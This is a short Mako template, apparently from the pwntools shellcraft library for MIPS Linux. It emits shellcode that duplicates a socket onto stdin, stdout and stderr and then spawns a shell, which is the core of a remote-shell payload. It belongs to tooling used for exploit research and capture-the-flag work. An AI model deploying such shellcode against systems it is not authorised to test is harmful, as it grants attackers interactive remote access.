<% from pwnlib.shellcraft.mips import linux %>
<%page args="sock = '$s0'"/>
<%docstring>
Args: [sock (imm/reg) = s0 ]
    Duplicates sock to stdin, stdout and stderr and spawns a shell.
</%docstring>


${linux.dup2(sock,2)}
${linux.dup2(sock,1)}
${linux.dup2(sock,0)}

${linux.sh()}
